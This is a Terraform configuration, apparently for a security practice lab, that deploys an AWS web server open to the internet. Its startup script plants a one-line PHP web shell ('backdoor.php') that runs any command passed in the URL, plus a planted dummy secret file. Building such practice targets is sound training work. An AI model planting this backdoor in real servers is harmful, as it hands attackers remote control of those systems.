# Name: VulnerableLab
# Author: churroxd8
# Description: A deliberately vulnerable Web Server with an RCE injection point injected via User Data

terraform {
  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 4.16"
    }
    http = {
      source  = "hashicorp/http"
      version = "~> 3.0"
    }
  }
}

provider "aws" {
  region = "us-east-1"
}

# 1. Get Your IP (for SSH access)
data "http" "my_ip" {
  url = "http://ipv4.icanhazip.com"
}

# 2. The Firewall (Now with HTTP!)
resource "aws_security_group" "vulnerable_sg" {
  name        = "vulnerable_web_server_sg"
  description = "Allow SSH (secure) and HTTP (insecure)"

  # Allow SSH only from YOUR IP (Management)
  ingress {
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = ["${chomp(data.http.my_ip.response_body)}/32"]
  }

  # Allow HTTP from ANYWHERE (The Public Web)
  # This makes the web server visible to the world
  ingress {
    from_port   = 80
    to_port     = 80
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }

  # Allow server to talk to the internet
  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }
}

# 3. The Vulnerable Server
resource "aws_instance" "bad_server" {
  ami           = "ami-053b0d53c279acc90" # Ubuntu 22.04
  instance_type = "t3.micro"              # Free Tier Safe

  vpc_security_group_ids = [aws_security_group.vulnerable_sg.id]
  
  tags = {
    Name = "MyVulnerableTarget"
  }

  # 4. THE PAYLOAD (This runs on startup)
  # This script installs Apache/PHP and writes a backdoor file.
  user_data = <<-EOF
              #!/bin/bash
              apt-get update -y
              apt-get install -y apache2 php libapache2-mod-php
              systemctl start apache2
              systemctl enable apache2
              
              # THE VULNERABILITY:
              # A PHP file that executes whatever command is passed in the URL
              echo '<?php if(isset($_GET["cmd"])) { system($_GET["cmd"]); } ?>' > /var/www/html/backdoor.php
              
              # A SECRET FILE TO STEAL:
              echo 'CONFIDENTIAL_API_KEY=12345-SUPER-SECRET' > /etc/secret_file.txt
              EOF
}

output "target_ip" {
  value = aws_instance.bad_server.public_ip
}